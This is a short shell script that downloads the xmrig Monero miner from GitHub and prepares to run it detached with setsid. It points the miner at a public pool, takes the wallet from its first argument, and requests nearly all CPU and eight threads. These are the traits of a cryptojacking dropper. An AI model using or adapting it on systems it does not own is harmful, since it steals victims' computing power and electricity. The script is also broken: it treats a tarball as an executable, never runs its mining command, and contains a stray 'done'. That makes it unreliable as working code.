#! /bin/sh
PRO_NAME=xmrig_0c 
while true;do
	wget -T 15 -c -O ./xmrig_0c https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-focal-x64.tar.gz && break
done 
chmod 777 ./xmrig_0c
qianbao=$1
CMD="setsid ./xmrig_0c --coin=monero -o pool.minexmr.com:4444 -u $qianbao --randomx-mode=fast --cpu-max-threads-hint 99 --threads=8"
done
exit 0
